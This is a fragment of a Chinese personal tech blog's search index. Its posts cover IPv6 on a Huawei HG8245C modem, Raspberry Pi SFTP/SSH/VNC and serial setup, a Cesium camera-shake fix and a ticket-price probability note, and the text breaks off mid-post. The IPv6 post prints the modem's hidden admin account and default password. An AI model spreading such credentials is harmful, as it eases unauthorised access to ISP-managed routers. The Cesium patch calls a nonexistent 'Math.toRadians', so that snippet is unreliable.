【相机标定】四个坐标系之间的变换关系 SLAM相机位姿估计(1),by Zhao xuhui. 单目SLAM理论基础,by Zhao xuhui.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>3D</tag>
        <tag>计算机视觉</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[生活中的统计学之购买车展黄牛票]]></title>
    <url>%2F2018%2F11%2F17%2F%E7%94%9F%E6%B4%BB%E4%B8%AD%E7%9A%84%E7%BB%9F%E8%AE%A1%E5%AD%A6%E4%B9%8B%E8%B4%AD%E4%B9%B0%E8%BD%A6%E5%B1%95%E9%BB%84%E7%89%9B%E7%A5%A8%2F</url>
    <content type="text"><![CDATA[前段时间去看车展，一出地铁口，就有黄牛兜售车展门票，只需30元一张，而从车展正规窗口购买需要50元一张，那么买黄牛票还是买正规车展门票呢？ 黄牛票有可能是真的，这样我就只需30元就可以参观车展，也有可能是假的，这样我就得花80元才能参观车展。假设黄牛票为真的概率是p1，根据概率论的知识，我参观车展花费的期望是： E = 30*p_1+80*(1-p_1)在没有任何先验知识的前提下，假设黄牛票为真的概率是0.5，于是每次买黄牛票参观车展的花费期望是55，而每次买正规门票参观车展的花费期望是50，因此不建议买黄牛票，而应该去买正规车展门票。 参考链接 Cmd Markdown 公式指导手册 Markdown中写数学公式]]></content>
      <tags>
        <tag>概率论</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[中国电信光猫华为HG8245C开启IPV6的方法]]></title>
    <url>%2F2018%2F11%2F11%2F%E4%B8%AD%E5%9B%BD%E7%94%B5%E4%BF%A1%E5%85%89%E7%8C%AB%E5%8D%8E%E4%B8%BAHG8245C%E5%BC%80%E5%90%AFIPV6%E7%9A%84%E6%96%B9%E6%B3%95%2F</url>
    <content type="text"><![CDATA[据报道，目前中国电信已成功创建了IP骨干网全面支持IPv6，并且在4G网络开启了IPv6服务，在100多个城域网提供了IPv6服务[1]。那么如何使家里宽带用上IPv6服务呢？这个问题最关键是设置入户光猫使其支持IPv6。以如何光猫华为HG8245C为例，说明设置过程。 基础知识IPv6简介网际协议第6版（英文：Internet Protocol version 6，缩写：IPv6）是网际协议（IP）的最新版本，用作互联网的网上层协议，用它来取代IPv4主要是为了解决IPv4地址枯竭问题，不过它也在其他很多方面对IPv4有所改进。 IPv6格式IPv6二进位制下为128位长度，以16位为一组，每组以冒号“:”隔开，可以分为8组，每组以4位十六进制方式表示。例如：2001:0db8:85a3:08d3:1319:8a2e:0370:7344 是一个合法的IPv6地址。 同时IPv6在某些条件下可以省略： 每项数字前导的0可以省略，省略后前导数字仍是0则继续，例如下组IPv6是等价的。 123452001:0DB8:02de:0000:0000:0000:0000:0e132001:DB8:2de:0000:0000:0000:0000:e132001:DB8:2de:000:000:000:000:e132001:DB8:2de:00:00:00:00:e132001:DB8:2de:0:0:0:0:e13 可以用双冒号“::”表示一组0或多组连续的0，但只能出现一次。 1234567* 2001:DB8:2de:0:0:0:0:e13 2001:DB8:2de::e13* 2001:0DB8:0000:0000:0000:0000:1428:57ab 2001:0DB8:0000:0000:0000::1428:57ab 2001:0DB8:0:0:0:0:1428:57ab 2001:0DB8:0::0:1428:57ab 2001:0DB8::1428:57ab 如果这个地址实际上是IPv4的地址，后32位可以用10进制数表示；因此::ffff:192.168.89.9 相等于::ffff:c0a8:5909。 IPv6地址分类常用地址IPv6地址可分为三种: 单播（unicast）地址：单播地址标示一个网上接口。协议会把送往地址的数据包送往给其接口。 任播（anycast）地址: Anycast是IPv6特有的数据发送方式，它像是IPv4的Unicast（单点传播）与Broadcast（多点广播）的综合。 多播（multicast）地址: 多播地址也称组播地址。多播地址也被指定到一群不同的接口，送到多播地址的数据包会被发送到所有的地址。 特殊地址未指定地址 ::/128－所有比特皆为零的地址称作未指定地址。 链路本地地址 ::1/128－是一种单播绕回地址。如果一个应用程序将数据包送到此地址，IPv6堆栈会转送这些数据包绕回到同样的虚拟接口（相当于IPv4中的127.0.0.1/8）。 fe80::/10－这些链路本地地址指明，这些地址只在区域连线中是合法的，这有点类似于IPv4中的169.254.0.0/16。 唯一区域位域 fc00::/7－唯一区域地址（ULA，unique local address）只可在一群网站中绕送。 多播地址 ff00::/8－这个前置表明定义在”IP Version 6 Addressing Architecture”（RFC 4291）中的多播地址[ IPv4转译地址 ::ffff:x.x.x.x/96－用于IPv4映射地址。 2001::/32－用于Teredo隧道。 2002::/16－用于6to4。 IPv6优势 巨大的地址空间 新的协议头格式，加快路由速度 有效地、分级的寻址和路由结构 有状态和无状态的地址配置 内置的安全性 更好的支持Qos 用新协议处理邻节点的交互 可扩展性 设置华为光猫HG8245C开启IPv6步骤在设置华为光猫HG8245C开启IPv6之前，一是要确保所在电信已支持IPv6服务。二是获取华为HG8245C隐藏管理员帐号telecomadmin的密码，通常为nE7jA%5m。 以隐藏管理员帐号telecomadmin登录华为HG8245C的Web管理控制台后，选择“网络-&gt;宽带设置”，选择连接”2INTERNET_R_VID“,设置协议类型为“IPv4/IPv6”，设置前缀获取方式为“DHCPv6-PD”,再点应用即可。 在Debian Linux中打开终端，输入如下命令或者浏览网站http://test-ipv6.com/验证IPv6。123456789101112131415$ ip addr1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000 link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00 inet 127.0.0.1/8 scope host lo valid_lft forever preferred_lft forever inet6 ::1/128 scope host valid_lft forever preferred_lft forever2: wlan0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP group default qlen 1000 link/ether e4:70:b8:30:f1:5b brd ff:ff:ff:ff:ff:ff inet 192.168.1.100/24 brd 192.168.1.255 scope global dynamic noprefixroute wlan0 valid_lft 251566sec preferred_lft 251566sec inet6 240e:bc:e60:3d00:ea5b:f704:6b65:fab1/64 scope global dynamic noprefixroute valid_lft 258984sec preferred_lft 172584sec inet6 fe80::4e2c:4397:f016:3eb4/64 scope link noprefixroute valid_lft forever preferred_lft forever 参考链接 中国电信：IPv6在线用户已超千万 年底将完成端到端服务能力.2018-07-16 维基百科.IPv6 掌握IPv6网络协议的优势,2010-06-10]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>IPv6</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[树莓派学习之SFTP管理文件]]></title>
    <url>%2F2018%2F11%2F09%2F%E6%A0%91%E8%8E%93%E6%B4%BE%E5%AD%A6%E4%B9%A0%E4%B9%8BSFTP%E7%AE%A1%E7%90%86%E6%96%87%E4%BB%B6%2F</url>
    <content type="text"><![CDATA[当需要向树莓派发送文件时，可使用SFTP上传下载文件。下面介绍如何使用SFTP向树莓派发送下载文件。 基础知识SFTP是Secure File Transfer Protocol的缩写，安全文件传送协议。可以为传输文件提供一种安全的网络的加密方法。sftp 与 ftp 有着几乎一样的语法和功能。 SFTP 为 SSH的其中一部分，是一种传输文件至服务器的安全方式。在SSH软件包中，已经包含了一个叫作SFTP(Secure File Transfer Protocol)的安全文件信息传输子系统，SFTP本身没有单独的守护进程，它必须使用sshd守护进程（端口号默认是22）来完成相应的连接和答复操作。 SFTP传输使用了加密/解密技术，所以传输效率比普通的FTP要低得多，如果您对网络安全性要求更高时，可以使用SFTP代替FTP。 SFTP客户端程序在Windows平台，常用的SFTP客户端程序有： FileZilla WinSCP Xftp Core FTP 在Linux平台，可直接使用sftp命令进行连接服务器。 基本操作下面介绍在Debian平台使用sftp命令连接树莓派，在此之前应配置树莓派开启ssh服务。 建立连接 使用如下命令连接树莓派：1sftp pi@192.168.0.103 查看帮助 通过help查看在sftp连接下能使用的命令。从帮助中可知，在命令前加前缀“l”或者“！”即可在本地操作系统shell执行命令。12345678910111213141516171819202122232425262728293031323334sftp&gt; helpAvailable commands:bye Quit sftpcd path Change remote directory to &apos;path&apos;chgrp grp path Change group of file &apos;path&apos; to &apos;grp&apos;chmod mode path Change permissions of file &apos;path&apos; to &apos;mode&apos;chown own path Change owner of file &apos;path&apos; to &apos;own&apos;df [-hi] [path] Display statistics for current directory or filesystem containing &apos;path&apos;exit Quit sftpget [-afPpRr] remote [local] Download filereget [-fPpRr] remote [local] Resume download filereput [-fPpRr] [local] remote Resume upload filehelp Display this help textlcd path Change local directory to &apos;path&apos;lls [ls-options [path]] Display local directory listinglmkdir path Create local directoryln [-s] oldpath newpath Link remote file (-s for symlink)lpwd Print local working directoryls [-1afhlnrSt] [path] Display remote directory listinglumask umask Set local umask to &apos;umask&apos;mkdir path Create remote directoryprogress Toggle display of progress meterput [-afPpRr] local [remote] Upload filepwd Display remote working directoryquit Quit sftprename oldpath newpath Rename remote filerm path Delete remote filermdir path Remove remote directorysymlink oldpath newpath Symlink remote fileversion Show SFTP version!command Execute &apos;command&apos; in local shell! Escape to local shell? Synonym for help 下载远程文件到本地主机使用get命令下载远程文件到本地主机：123sftp&gt; get README.TXT Fetching /home/pi/wiringPi/README.TXT to README.TXT/home/pi/wiringPi/README.TXT 100% 606 39.1KB/s 00:00 get命令还有一些有用参数，如递归选项“ -r ”来递归的复制一个文件夹里面的内容，“ -P ”或者“ -p ”参数来告诉 SFTP 保持文件的权限访问位的设置和访问时间。 上传本地文件到远程主机使用“ put ”命令将文件上传到远程主机：123sftp&gt; put README.TXT Uploading README.TXT to /home/pi/README.TXTREADME.TXT 100% 606 33.6KB/s 00:00 ” put “具有类似“ get ”的参数。例如，递归选项“ -r ”可以上传整个文件夹。 参考文献 华华. 手把手教你使用 SFTP 安全地传输文件.2015-12-5.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>树莓派</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Cesium摄像头跟踪飞机实体时晃动问题分析]]></title>
    <url>%2F2018%2F11%2F08%2FCesium%E6%91%84%E5%83%8F%E5%A4%B4%E8%B7%9F%E8%B8%AA%E9%A3%9E%E6%9C%BA%E5%AE%9E%E4%BD%93%E6%97%B6%E6%99%83%E5%8A%A8%E9%97%AE%E9%A2%98%E5%88%86%E6%9E%90%2F</url>
    <content type="text"><![CDATA[在3D场景下使用Cesium跟踪飞机时会出现摄像头晃动问题，导致地图背景不断晃动，影响观看。下面以最新的Cesium1.51源码为例，解析Cesium 渲染过程原理，分析跟踪实体时摄像头晃动的原因，找出可能的解决方法。 Cesium渲染过程分析使用Cesium最简单示例代码如下：1var viewer = new Cesium.Viewer(&apos;cesiumContainer&apos;); Viewer是Cesium构建应用的最基础的组件。它又是其他组件的容器，包括： animation:控制时间前进、倒退、暂停以及前进和倒退速度的组件 baseLayerPicker：图层选择组件 fullscreenButton：控制是否全屏的组件 vrButton：控制是否VR显示的组件 geocoder：地理位置搜索组件 homeButton：返回摄像头默认位置按钮组建 infoBox：信息框组件 sceneModePicker：场景模式选择组件 selectionIndicator：选择指示组件 timeline：时间线组件 navigationHelpButton：导航帮助按钮，告诉使用者如何使用鼠标和触摸屏操纵虚拟地球 CesiumWidget：虚拟地球组件 其中，虚拟地球组件CesiumWidget是Viewer包含核心组件，在Viewer中创建CesiumWidget对象时，将设置其useDefaultRenderLoop属性。设置该属性将启动渲染函数startRenderLoop。1234567891011121314//from Source/Widgets/CesiumWidget/CesiumWidget.jsuseDefaultRenderLoop : &#123; get : function() &#123; return this._useDefaultRenderLoop; &#125;, set : function(value) &#123; if (this._useDefaultRenderLoop !== value) &#123; this._useDefaultRenderLoop = value; if (value &amp;&amp; !this._renderLoopRunning) &#123; startRenderLoop(this); &#125; &#125; &#125;&#125;, 函数startRenderLoop是Cesium渲染的开始，其代码如下：12345678910111213141516171819202122232425262728293031323334353637function startRenderLoop(widget) &#123; widget._renderLoopRunning = true; var lastFrameTime = 0; function render(frameTime) &#123; if (widget.isDestroyed()) &#123; return; &#125; if (widget._useDefaultRenderLoop) &#123; try &#123; var targetFrameRate = widget._targetFrameRate; if (!defined(targetFrameRate)) &#123; widget.resize(); widget.render(); requestAnimationFrame(render); &#125; else &#123; var interval = 1000.0 / targetFrameRate; var delta = frameTime - lastFrameTime; if (delta &gt; interval) &#123; widget.resize(); widget.render(); lastFrameTime = frameTime - (delta % interval); &#125; requestAnimationFrame(render); &#125; &#125; catch (error) &#123; ... &#125; &#125; else &#123; widget._renderLoopRunning = false; &#125; &#125; requestAnimationFrame(render);&#125; CesiumWidget组件的render方法随后调用Scene的render方法。12345678910111213141516171819202122232425262728293031323334353637383940414243Scene.prototype.render = function(time) &#123; if (!defined(time)) &#123; time = JulianDate.now(); &#125; var frameState = this._frameState; this._jobScheduler.resetBudgets(); var cameraChanged = this._view.checkForCameraUpdates(this); var shouldRender = !this.requestRenderMode || this._renderRequested || cameraChanged || this._logDepthBufferDirty || (this.mode === SceneMode.MORPHING); if (!shouldRender &amp;&amp; defined(this.maximumRenderTimeChange) &amp;&amp; defined(this._lastRenderTime)) &#123; var difference = Math.abs(JulianDate.secondsDifference(this._lastRenderTime, time)); shouldRender = shouldRender || difference &gt; this.maximumRenderTimeChange; &#125; if (shouldRender) &#123; this._lastRenderTime = JulianDate.clone(time, this._lastRenderTime); this._renderRequested = false; this._logDepthBufferDirty = false; var frameNumber = CesiumMath.incrementWrap(frameState.frameNumber, 15000000.0, 1.0); updateFrameNumber(this, frameNumber, time); &#125; // Update this._preUpdate.raiseEvent(this, time); tryAndCatchError(this, update); this._postUpdate.raiseEvent(this, time); if (shouldRender) &#123; // Render this._preRender.raiseEvent(this, time); tryAndCatchError(this, render); RequestScheduler.update(); &#125; updateDebugShowFramesPerSecond(this, shouldRender); callAfterRenderFunctions(this); if (shouldRender) &#123; this._postRender.raiseEvent(this, time); &#125; &#125;; Scene的render方法中tryAndCatchError函数将调用render函数。在该render函数中，地球的主要要素（地形&amp;影像）的渲染，将在Globe的beginFrame和endFrame之间完成的。123456789101112131415161718192021222324function render(scene) &#123; ... if (defined(scene.globe)) &#123; scene.globe.beginFrame(frameState); &#125; updateEnvironment(scene); updateAndExecuteCommands(scene, passState, backgroundColor); resolveFramebuffers(scene, passState); passState.framebuffer = undefined; executeOverlayCommands(scene, passState); if (defined(scene.globe)) &#123; scene.globe.endFrame(frameState); if (!scene.globe.tilesLoaded) &#123; scene._renderRequested = true; &#125; &#125; ...&#125; 其中updateAndExecuteCommands负责数据的调度，比如哪些Tile需要创建，这些Tile相关的地形数据，以及涉及到的影像数据之间的调度，都是在该函数中维护。而scene.globe.endFrame中，会对该帧所涉及的GlobeTile的下载，解析等进行处理。 Cesium跟踪实体在Viewer组件构造函数内，Viewer订阅了场景组件Scene的渲染后事件postRender，以执行Viewer自己的_postRender函数。1eventHelper.add(scene.postRender, Viewer.prototype._postRender, this); Viewer的_postRender函数代码如下，其中updateTrackedEntity函数将更新被跟踪实体的摄像头位置：1234Viewer.prototype._postRender = function() &#123; updateZoomTarget(this); updateTrackedEntity(this);&#125;; updateTrackedEntity函数代码如下：1234567891011121314151617181920212223242526272829303132333435363738function updateTrackedEntity(viewer) &#123; if (!viewer._needTrackedEntityUpdate) &#123; return; &#125; var trackedEntity = viewer._trackedEntity; var currentTime = viewer.clock.currentTime; //Verify we have a current position at this time. This is only triggered if a position //has become undefined after trackedEntity is set but before the boundingSphere has been //computed. In this case, we will track the entity once it comes back into existence. var currentPosition = Property.getValueOrUndefined(trackedEntity.position, currentTime); if (!defined(currentPosition)) &#123; return; &#125; var scene = viewer.scene; var state = viewer._dataSourceDisplay.getBoundingSphere(trackedEntity, false, boundingSphereScratch); if (state === BoundingSphereState.PENDING) &#123; return; &#125; var sceneMode = scene.mode; if (sceneMode === SceneMode.COLUMBUS_VIEW || sceneMode === SceneMode.SCENE2D) &#123; scene.screenSpaceCameraController.enableTranslate = false; &#125; if (sceneMode === SceneMode.COLUMBUS_VIEW || sceneMode === SceneMode.SCENE3D) &#123; scene.screenSpaceCameraController.enableTilt = false; &#125; var bs = state !== BoundingSphereState.FAILED ? boundingSphereScratch : undefined; viewer._entityView = new EntityView(trackedEntity, scene, scene.mapProjection.ellipsoid); viewer._entityView.update(currentTime, bs); viewer._needTrackedEntityUpdate = false;&#125; 除此之外，Viewer组件订阅了Clock组建的onTick事件，以执行其自身的_onTick事件处理函数：1eventHelper.add(clock.onTick, Viewer.prototype._onTick, this); 在Viewer组件的_onTick事件处理函数中，同样会更新被跟踪实体的摄像头位置。而Cesium摄像头跟踪飞机实体时产生晃动的根源即在此处。12345678910111213141516171819Viewer.prototype._onTick = function(clock) &#123; var time = clock.currentTime; var isUpdated = this._dataSourceDisplay.update(time); if (this._allowDataSourcesToSuspendAnimation) &#123; this._clockViewModel.canAnimate = isUpdated; &#125; var entityView = this._entityView; if (defined(entityView)) &#123; var trackedEntity = this._trackedEntity; var trackedState = this._dataSourceDisplay.getBoundingSphere(trackedEntity, false, boundingSphereScratch); if (trackedState === BoundingSphereState.DONE) &#123; entityView.update(time, boundingSphereScratch); &#125; &#125; ... &#125;; 可行的解决方案在Viewer组件的_onTick函数做如下修改：1234567891011121314151617181920212223Viewer.prototype._onTick = function(clock) &#123; var time = clock.currentTime; var isUpdated = this._dataSourceDisplay.update(time); if (this._allowDataSourcesToSuspendAnimation) &#123; this._clockViewModel.canAnimate = isUpdated; &#125; var entityView = this._entityView; if (defined(entityView)) &#123; var trackedEntity = this._trackedEntity; var trackedState = this._dataSourceDisplay.getBoundingSphere(trackedEntity, false, boundingSphereScratch); if (trackedState === BoundingSphereState.DONE) &#123; //entityView.update(time, boundingSphereScratch); var range=this.camera.distanceToBoundingSphere(boundingSphereScratch); var targetRange=range&gt;boundingSphereScratch.radius*10?range:boundingSphereScratch.radius*10; var offset=new HeadingPitchRange(0.0,-Math.toRadians(45.0),targetRange); this.camera.viewBoundingSphere(boundingSphereScratch,offset) &#125; &#125; ... &#125;; 参考文献 http://www.cnblogs.com/fuckgiser/p/5744509.html, by 法克鸡丝]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>Cesium</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[树莓派学习之远程登录]]></title>
    <url>%2F2018%2F11%2F07%2F%E6%A0%91%E8%8E%93%E6%B4%BE%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%BF%9C%E7%A8%8B%E7%99%BB%E5%BD%95%2F</url>
    <content type="text"><![CDATA[每次通过USB转串口登录树莓派比较麻烦，可以设置树莓派开启ssh和vnc服务，以便通过ssh或vnc远程登录树莓派。下面介绍在Debian中通过ssh或vnc远程登录树莓派的过程。 基础知识SSHSecure Shell（安全外壳协议，简称SSH）是一种加密的网络传输协议，可在不安全的网络中为网络服务提供安全的传输环境。SSH通过在网络中创建安全隧道来实现SSH客户端与服务器之间的连接。SSH最常见的用途是远程登录系统，人们通常利用SSH来传输命令行界面和远程执行命令。 SSH基本用法1234# 以用户名user，登录远程主机host$ ssh user@host# SSH的默认端口是22。使用p参数，可以修改这个端口。$ ssh -p 2222 user@host SSH通信过程及风险SSH采用了公钥加密保证安全。 整个过程是这样的：（1）远程主机收到用户的登录请求，把自己的公钥发给用户。（2）用户使用这个公钥，将登录密码加密后，发送回来。（3）远程主机用自己的私钥，解密登录密码，如果密码正确，就同意用户登录。 这个过程本身是安全的，但是实施的时候存在”中间人攻击”风险：如果有人截获了登录请求，然后冒充远程主机，将伪造的公钥发给用户，那么用户很难辨别真伪。因为不像https协议，SSH协议的公钥是没有证书中心（CA）公证的，也就是说，都是自己签发的。 VNCVNC（Virtual Network Computing），为一种使用RFB协议的显示屏画面分享及远程操作软件。此软件借由网上，可发送键盘与鼠标的动作及即时的显示屏画面。 VNC与操作系统无关，因此可跨平台使用，例如可用Windows连线到某Linux的计算机，反之亦同。甚至在没有安装客户端程序的计算机中，只要有支持JAVA的浏览器，也可使用。 原理VNC系统由客户端，服务端和一个协议组成 VNC的服务端目的是分享其所运行机器的屏幕，服务端被动的允许客户端控制它。VNC客户端（或Viewer）观察控制服务端，与服务端交互。VNC协议Protocol（RFB）是一个简单的协议，传送服务端的原始图像到客户端（一个X,Y位置上的正方形的点阵数据），客户端传送事件消息到服务端。 服务器发送小方块的帧缓存给客户端，在最简单的情况，VNC协议使用大量的带宽，因此各种各样的方法被发明出来减少通讯的开支，举例来说，有各种各样的编码方法来决定最有效率的方法来传送这些点阵方块。 VNC默认使用TCP端口5900至5906，而JAVA的VNC客户端使用5800至5806。一个服务端可以在5900端口用“监听模式”连接一个客户端，使用监听模式的一个好处是服务端不需要设置防火墙。 安全性VNC并非是安全的协议，虽然VNC伺服程序需设置密码才可接受外来连线，且VNC客户端与VNC伺服程序之间的密码传输经过加密，但仍可被轻易的拦截到并使用暴力破解法破解。不过VNC可设计以SSH或VPN传输，以增加安全性。 VNC软件由于VNC以GPL授权，派生出了几个VNC软件： RealVNC：由VNC团队部分成员开发，分为全功能商业版及免费版。 TightVNC：强调节省带宽使用。 UltraVNC：加入了TightVNC的部分程序及加强性能的图型映射驱动程序，并结合Active Directory及NTLM的账号密码认证，但仅有Windows版本。 Vine Viewer：MacOSX的VNC客户端。 配置树莓派支持SSH和VNC通过USB转串口登录树莓派后，按如下步骤开启SSH和VNC： 运行命令raspi-config 1sudo raspi-config 选择第五项Interfacing Options 选择enable SSH 启用SSH，重复步骤一和二，再选择enable VNC。 通过SSH或VNC连接树莓派debian主机与树莓派在同一个局域网内，则按如下步骤通过SSH或VNC连接树莓派。 通过nmap命令获取树莓派ip地址1234567891011$ nmap 192.168.0.1/24Starting Nmap 7.70 ( https://nmap.org ) at 2018-11-08 13:08 CSTNmap scan report for 192.168.0.103Host is up (0.041s latency).Not shown: 998 closed portsPORT STATE SERVICE22/tcp open ssh5900/tcp open vncNmap done: 256 IP addresses (6 hosts up) scanned in 35.77 seconds 开启22和5900端口的主机即是树莓派。 通过ssh远程登录树莓派 12# 首次登录会给出主机认证不能建立的提示，输入yes可继续，再输入用户密码即可远程登录树莓派$ ssh pi@192.168.0.103 通过vnc远程登录树莓派 通过ssh登录树莓派后查看其使用的vnc程序 123$ apt list --installed | grep vncrealvnc-vnc-server/now 6.3.1.36657 armhf [已安装，可升级至：6.3.2.39069]# 可知，树莓派上使用realvnc程序 在Debian上安装realvnc客户端程序realvnc-vnc-viewer 在终端输入vncviewer，输入树莓派ip、用户名、密码即可登录树莓派 参考文献 http://www.ruanyifeng.com/blog/2011/12/ssh_remote_login.html， by 阮一峰 https://zh.wikipedia.org/zh-hans/Secure_Shell， by wikipedia https://zh.wikipedia.org/zh-hans/VNC， by wikipedia]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>树莓派</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[树莓派学习之USB转串口]]></title>
    <url>%2F2018%2F11%2F05%2F%E6%A0%91%E8%8E%93%E6%B4%BE%E5%AD%A6%E4%B9%A0%E4%B9%8BUSB%E8%BD%AC%E4%B8%B2%E5%8F%A3%2F</url>
    <content type="text"><![CDATA[最近研究树莓派，需要通过usb转串口去连接树莓派，然后设置其wifi连接。于是将用到计算机硬件知识整理一下，并记录通过usb转串口设置树莓派wifi连接的过程。 硬件知识计算机硬件常用接口有并口和串口，对应串行通信和并行通信。串行通信（英语：Serial communication）是指在计算机总线或其他数据信道上，每次传输一个比特数据，并连续进行以上单次过程的通信方式。与之对应的是并行通信，它在串行端口上通过一次同时传输若干比特数据的方式进行通信。 串行通信被用于长距离通信以及大多数计算机网络，在这些应用场合里，电缆和同步化使并行通信实际应用面临困难。凭借着其改善的信号完整性和传播速度，串行通信总线正在变得越来越普遍，甚至在短程距离的应用中，其优越性已经开始超越并行总线不需要串行化组件(serializer)，并解决了诸如时钟偏移（Clock skew）、互联密度（interconnect density）等缺点。PCI到PCI Express的升级就一个例子。 并口并行接口，简称并口。并口采用的是25针D形接头。所谓“并行”，是指8位数据同时通过并行线进行传送，这样数据传送速度大大提高，但并行传送的线路长度受到限制，因为长度增加，干扰就会增加，数据也就容易出错，目前，并行接口主要作为打印机端口等。 串口串口叫做串行接口，也称串行通信接口，即COM口。按电气标准及协议来分包括RS-232-C、RS-422、RS485、USB等。 RS-232-C、RS-422与RS-485标准只对接口的电气特性做出规定，不涉及接插件、电缆或协议。 串行端口可以用于连接外置调制解调器、绘图仪或串行打印机。它也可以控制台连接的方式连接网络设备，例如路由器和交换机，主要用来配置它们。 RS-232-C 也称标准接口，是目前最常用的一种串行通讯接口。它是在1970年由美国电子工业协会（EIA）联合贝尔系统、 调制解调器厂家及计算机终端生产厂家共同制定的用于串行通讯的标准。 传统的RS-232-C接口标准有22根线，采用标准25芯D型插头座。自IBM PC/AT开始使用简化了的9芯D型插座。计算机一般有两个串行口：COM1和COM2，9针D形接口通常在计算机后面能看到。现在有很多手机数据线或者物流接收器都采用COM口与计算机相连。 RS-422 为改进RS-232通信距离短、速率低的缺点，RS-422定义了一种平衡通信接口，将传输速率提高到10Mb/s，传输距离延长到4000英尺（速率低于100kb/s时），并允许在一条平衡总线上连接最多10个接收器。 RS-485 为扩展应用范围，EIA又于1983年在RS-422基础上制定了RS-485 标准，增加了多点、双向通信能力，即允许多个发送器连接到同一条总线上，同时增加了发送器的驱动能力和冲突保护特性，扩展了总线共模范围，后命名为 TIA/EIA-485-A标准。 Universal Serial Bus（通用串行总线） 简称USB，是目前计算机上应用较广泛的接口规范，由Intel、Microsoft、Compaq、IBM、NEC、Northern Telcom等几家大厂商发起的新型外设接口标准。USB接口是计算机主板上的一种四针接口，其中中间两个针传输数据，两边两个针给外设供电。USB接口速度快、连接简单、不需要外接电源，传输速度12Mbps，新的USB 2.0可达480Mbps；电缆最大长度5米，USB电缆有4条线：2条信号线，2条电源线，可提供5伏特电源，USB电缆还分屏蔽和非屏蔽两种，屏蔽电缆传输速度可达12Mbps，价格较贵，非屏蔽电缆速度为1.5Mbps，但价格便宜；USB通过串联方式最多可串接127个设备；支持热插拔。最新的规格是USB 3.1。 RJ-45接口 是以太网最为常用的接口，RJ45是一个常用名称，指的是由IEC(60)603-7标准化，使用由国际性的接插件标准定义的8个位置（8针）的模块化插孔或者插头。 USB转串口原理硬件接口电气特性 TTL电平：一般用作数字芯片的电平，例如芯片的供电电压是5V，那么高电平就是5V，低电平就是0V，这里所说的电平，就是TTL电平。 232电平：232电平特制电脑串口的电平，-12V左右为正电平，+12V左右为低电平。我们刚才所见到的“USB转串口线”和电脑原生的串口，就是232电平。 USB转串口方法PC的串口电气特性是232电平，单片机的串口电气特性是TTL电平，这两个就不一样，肯定需要某个芯片或者电路来进行转换匹配才可以通信。这个时候我们就需要TTL转232芯片了，常见的是MAX232,MAX3232等。连接方式如下: 但是随着USB接口的普及，当前计算机已经取消了串口。为实现232到TTL的转换，又需要USB转232。连接方式如下： 为简化，可将USB转232和232转TTL集成到一个芯片上。这样的芯片常见的有CH340、PL2303。连接方式如下： 常见的CH340芯片如下图所示： 通过USB转串口连接树莓派下面介绍在Debian Linux主机通过USB转串口连接树莓派的过程。 配置树莓派开启串口通信将树莓派操作系统镜像烧录到SD卡后，打开boot分区，编辑其config.txt，在其末尾添加如下代码，以开启串口通信权限。1enable_uart=1 通过USB转串口物理连接树莓派通过将USB转串口将Debian主机和树莓派物理连接好之后，给树莓派加电启动。 查看Debian系统能否识别ch340芯片在官方Linux内核版本中自Kernel2.6以后就默认包含了对CH340/CH341芯片的驱动支持。在系统的默认驱动目录/lib/modules/$(uname -r)/kernel/drivers内可找到ch340芯片的驱动文件ch341.ko。 使用命令lsusb或dmesg查看linux系统是否识别USB转串口硬件。12345678~$ lsusbBus 002 Device 001: ID 1d6b:0003 Linux Foundation 3.0 root hubBus 001 Device 005: ID 0bda:0129 Realtek Semiconductor Corp. RTS5129 Card Reader ControllerBus 001 Device 004: ID 8087:0a2a Intel Corp. Bus 001 Device 003: ID 1bcf:2b8a Sunplus Innovation Technology Inc. Bus 001 Device 006: ID 1a86:7523 QinHeng Electronics HL-340 USB-Serial adapterBus 001 Device 002: ID 046d:c062 Logitech, Inc. M-UAS144 [LS1 Laser Mouse]Bus 001 Device 001: ID 1d6b:0002 Linux Foundation 2.0 root hub Bus 001 Device 006: ID 1a86:7523 QinHeng Electronics HL-340 USB-Serial adapter表明Linux系统识别了usb转串口线缆，芯片类型为HL-340。 ‘dmesg’命令显示linux内核的环形缓冲区信息，我们可以从中获得诸如系统架构、cpu、挂载的硬件，RAM等多个运行级别的大量的系统信息。当计算机启动时，系统内核（操作系统的核心部分）将会被加载到内存中。在加载的过程中会显示很多的信息，在这些信息中我们可以看到内核检测硬件设备。运行dmesg，输出如下：1234567891011~$ sudo dmesg | tail[ 4248.441104] usbcore: registered new interface driver usbserial_generic[ 4248.441112] usbserial: USB Serial support registered for generic[ 4248.456079] usbcore: registered new interface driver ch341[ 4248.456088] usbserial: USB Serial support registered for ch341-uart[ 4248.456097] ch341 1-3:1.0: ch341-uart converter detected[ 4248.456464] usb 1-3: ch341-uart converter now attached to ttyUSB0[ 4284.405593] i2c_hid i2c-ELAN1010:00: i2c_hid_get_input: incomplete report (14/65535)[ 4284.407844] i2c_hid i2c-ELAN1010:00: i2c_hid_get_input: incomplete report (14/65535)[ 4657.772761] i2c_hid i2c-ELAN1010:00: i2c_hid_get_input: incomplete report (14/65535)[ 4657.774969] i2c_hid i2c-ELAN1010:00: i2c_hid_get_input: incomplete report (14/65535) [ 4248.456097] ch341 1-3:1.0: ch341-uart converter detected;[ 4248.456464] usb 1-3: ch341-uart converter now attached to ttyUSB0说明linux系统识别了usb转串口适配器，并附加到ttyUSB0文件上。 使用minicom连接树莓派minicom是linux平台的串行通信程序，类似于windows的超级终端程序。1234567891011121314151617181920212223242526272829$ usermod -a -G dialout $USER#首次运行minicom使用-s选项，用于设置串行通信参数$ minicom -s+-----[configuration]------+| Filenames and paths || File transfer protocols || Serial port setup || Modem and dialing || Screen and keyboard || Save setup as dfl || Save setup as.. || Exit || Exit from Minicom 